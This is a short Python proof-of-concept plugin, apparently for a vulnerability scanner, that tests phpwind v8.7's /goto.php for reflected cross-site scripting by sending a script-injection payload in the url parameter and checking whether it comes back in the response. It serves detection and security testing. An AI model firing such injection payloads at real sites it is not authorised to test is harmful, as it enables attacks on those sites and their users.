#!/usr/bin/env python
# -*- coding: utf-8 -*-
# author:range
# refer:http://seclists.org/fulldisclosure/2015/May/106
# refer:http://www.beebeeto.com/pdb/poc-2015-0104/

import re


def assign(service, arg):
    if service == "phpwind":
        return True, arg


def audit(arg):
    payload = '/goto.php?url=range"><to>alert(1)</script>.com/'
    verify_url = arg + payload
    code, head, res, _, _ = curl.curl(verify_url)
    if code == 200 and 'url=range"><to>alert(1)</script>.com' in res:
        security_info(verify_url + ': phpwind v8.7 /goto.php reflect xss')

if __name__ == '__main__':
    from dummy import *
    audit(assign('phpwind', 'http://www.example.com')[1])